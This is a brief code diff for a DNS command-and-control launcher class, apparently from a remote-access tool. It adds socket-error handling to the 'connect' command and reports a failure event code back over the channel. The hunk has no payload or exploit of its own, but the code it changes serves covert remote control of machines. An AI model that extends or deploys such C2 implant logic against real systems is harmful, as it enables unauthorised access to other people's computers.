@@ -407,7 +407,13 @@ class DNSCncLauncher(BaseLauncher):
                 wait = True
 
             elif command[0] == 'connect':
-                connection = self.on_connect(command)
+                try:
+                    connection = self.on_connect(command)
+                except socket.error:
+                    pass
+
+                if not connection:
+                    self.event(0x20000000 | 0xFFFE)
 
         if wait:
             sleep(5)
